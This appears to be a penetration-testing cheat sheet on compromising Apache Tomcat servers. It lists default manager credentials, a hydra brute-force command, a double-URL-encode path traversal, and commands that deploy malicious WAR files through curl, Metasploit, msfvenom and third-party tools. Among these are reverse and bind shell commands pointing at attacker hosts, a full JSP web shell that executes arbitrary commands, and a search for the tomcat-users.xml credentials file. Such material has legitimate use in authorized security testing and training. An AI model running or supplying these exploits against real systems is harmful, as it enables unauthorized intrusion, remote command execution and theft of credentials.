# Tomcat

It usually runs on **port 8080**

## Avoid to run with root

In order to not run Tomcat with root a very common configuration is to set an Apache server in port 80/443 and, if the path requested matches a regexp, the request is send to the Tomcat running in other port. 

## Username Enum

In some versions prior to Tomcat6 you could enumerate users:

```bash
msf> use auxiliary/scanner/http/tomcat_enum
```

## Default credentials

The most interesting path of Tomcat is _/manager/html_, inside that path you can upload and deploy war files \(execute code\). But  this path is protected by basic TTP auth, the most common credentials are:

* admin:admin
* tomcat:tomcat
* admin:&lt;NOTHING&gt;
* admin:s3cr3t
* tomcat:s3cr3t
* admin:tomcat

You could test these and more using:

```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```

### Bruteforce

This could be needed.

```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```

## Vulns

A well-known vulnerability _to_ access the application manager __ is mod\_jk in CVE-2007-1860, that allows **Double URL encode path traversal.**

In order to access to the management web of the Tomcat go to: _pathTomcat/%252E%252E/manager/html_

Take into account that to upload the webshell you could need to use the double urlencode trick and send also a cookie and/or a SSRF token.  
To access to backdoor you could also need to use the double urlencode trick.

## RCE

Finally, if you have access to the Tomcat Web Application Manager, you can **upload and deploy a .war file \(execute code\)**.

### Limitations

You will only be able to deploy a WAR if you have **enough privileges** \(roles: **admin**, **manager** and **manager-script**\). Those details can be find under _tomcat-users.xml_ usually defined in `/usr/share/tomcat9/etc/tomcat-users.xml` \(it vary between versions\) \(see [POST ](tomcat.md#post)section\).

```bash
# /!\ tomcat7 and above uses /manager/text/undeploy and /manager/text/deploy paths
# tomcat6-admin (debian) or tomcat6-admin-webapps (rhel) has to be installed

# deploy under "path" context path
curl --upload-file monshell.war "http://tomcat:Password@localhost:8080/manager/deploy?path=/monshell"

# undeploy
curl "http://tomcat:Password@localhost:8080/manager/undeploy?path=/monshell"
```

### Metasploit

```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```

### MSFVenom Reverse Shell

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.41 LPORT=80 -f war -o revshell.war
```

Then, upload the revshell.war file and access to it \(_/revshell/_\)

### Bind and reverse shell with [tomcatWarDeployer.py](https://github.com/mgeeky/tomcatWarDeployer)

In some scenarios this doesn't  work \(for example old versions of sun\)

#### Download

```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git
```

#### Reverse shell

```bash
./tomcatWarDeployer.py -U <username> -P <password>-H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
```

#### Bind shell

```bash
./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```

### Using [Culsterd](https://github.com/hatRiot/clusterd)

```bash
clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
```

### Manual method - Web shell

Create **index.jsp** with this content:

```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>

```

```bash
$ mkdir webshell
$ cp index.jsp webshell
$ cd webshell
$ jar -cvf ../webshell.war *
webshell.war is created
```

You could also install this \(allows upload, download and command execution\): [http://vonloesch.de/filebrowser.html](http://vonloesch.de/filebrowser.html)

## POST

Name of tomcat credentials file is _tomcat-users.xml_ 

```bash
find / -name tomcat-users.xml 2>/dev/null
```

Other ways to gather tomcat credentials:

```bash
msf> use post/multi/gather/tomcat_gather
msf> use post/windows/gather/enum_tomcat
```

